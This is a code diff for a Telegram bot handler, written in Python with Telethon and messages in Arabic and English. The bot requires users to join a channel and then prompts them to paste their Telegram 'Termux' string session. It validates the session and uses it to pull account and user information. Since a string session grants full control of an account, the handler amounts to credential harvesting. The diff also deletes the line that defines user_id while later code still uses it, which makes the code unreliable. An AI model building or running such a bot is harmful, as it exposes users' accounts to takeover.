@@ -1570,9 +1570,7 @@ async def users(event):
         await event.respond("""Please join @PrivaPact for the bot to work!
         
 الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
-        return
-
-    user_id = event.sender_id
+        return 
 
     # Check if the user is a developer
     is_developer = user_id in Developers
@@ -1592,33 +1590,26 @@ async def users(event):
     # Update the command cooldown for the user, unless they are a developer
     if not is_developer:
         command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
-    sender_id = event.sender_id  # Store the sender_id
+    sender_id = user_id  # Store the sender_id
 
     async with bot.conversation(event.chat_id) as x:
         try:
             await x.send_message("""Now send me the Termux Session so I can send you all users info.
                            
 الان ارسل لي كود الترمكس لكي ارسل لك معلومات المستخدم""")
-            
-            # Wait for the Termux Session message
-            strses = await x.get_response(
-                events.NewMessage(from_users=sender_id),
-                timeout=60,
-            )
+            strses = await x.wait_event(events.NewMessage(from_users=sender_id), timeout=60)
 
             # Check if the session is empty
             if not strses.text:
-                await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)
-                return
+                return await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)
 
             op = await cu(strses.text)
             if op:
                 pass
             else:
-                await event.respond("""Invalid Session, please use another one.
+                return await event.respond("""Invalid Session, please use another one.
                                    
 ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
-                return
 
             try:
                 i = await userinfo(strses.text)
@@ -1632,7 +1623,7 @@ async def users(event):
                                    
 ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
         except TimeoutError:
-            await event.respond("""Please provide the termux session within 60 seconds.
+            return await event.respond("""Please provide the termux session withing 60 seconds
             
 الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
 
